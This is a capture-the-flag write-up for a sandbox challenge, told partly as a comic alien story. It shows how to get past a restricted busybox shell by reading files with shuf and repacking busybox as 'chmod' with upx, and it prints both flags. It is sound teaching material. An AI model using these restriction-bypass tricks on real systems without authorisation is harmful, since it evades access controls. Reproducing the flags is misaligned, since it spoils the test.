# Work Computer (sandbox)

With the confidence of conviction and decision making skills that made you a contender for Xenon's Universal takeover council, now disbanded, you forge ahead to the work computer.   This machine announces itself to you, surprisingly with a detailed description of all its hardware and peripherals. Your first thought is "Why does the display stand need to announce its price? And exactly how much does 999 dollars convert to in Xenonivian Bucklets?" You always were one for the trivialities of things.

Also presented is an image of a fascinating round and bumpy creature, labeled "Cauliflower for cWo" - are "Cauliflowers" earthlings?  Your 40 hearts skip a beat - these are not the strange unrelatable bipeds you imagined earthings to be.. this looks like your neighbors back home. Such curdley lobes. Will it be at the party?

SarahH, who appears to be  a programmer with several clients, has left open a terminal.  Oops.  Sorry clients!  Aliens will be poking around attempting to access your networks.. looking for Cauliflower.   That is, *if* they can learn to navigate such things.

readme.ctfcompetition.com 1337

### Solution
```bash
> nc -v readme.ctfcompetition.com 1337
> ls -la
total 12
drwxrwxrwt    2 0        0               80 Jul 14 12:17 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
----------    1 1338     1338            33 Jul 14 12:17 ORME.flag
-r--------    1 1338     1338            28 Jul 14 12:17 README.flag
```

Of course, we don't have any commands like: `cat`, `less`, `more` and so on... Let's see what we have:
```bash
> ls -la /bin
total 808
drwxr-xr-x    2 65534    65534         4096 Jun 13 14:28 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arch -> /bin/busybox
-rwxr-xr-x    1 65534    65534       796240 Jan 24 07:45 busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chgrp -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chown -> /bin/busybox
...

# Dump all available command.
> echo "ls -la /bin /sbin /usr/bin /usr/sbin" | nc -v readme.ctfcompetition.com 1337 > dump.txt

> shuf README.flag  # iconv README.flag
CTF{4ll_D474_5h4ll_B3_Fr33}
> shuf ORME.flag
shuf: ORME.flag: Permission denied
```
In `dump.txt` we can also find the [upx](https://upx.github.io/) command which is an executable packer. Thanks to that we will be able to create a compressed busybox named `chmod`.
```bash
> upx -9 -o /tmp/chmod /bin/busybox
> /tmp/chmod 777 ORME.flag
> shuf ORME.flag
CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
```

**FLAG: CTF{4ll_D474_5h4ll_B3_Fr33}**

**FLAG: CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}**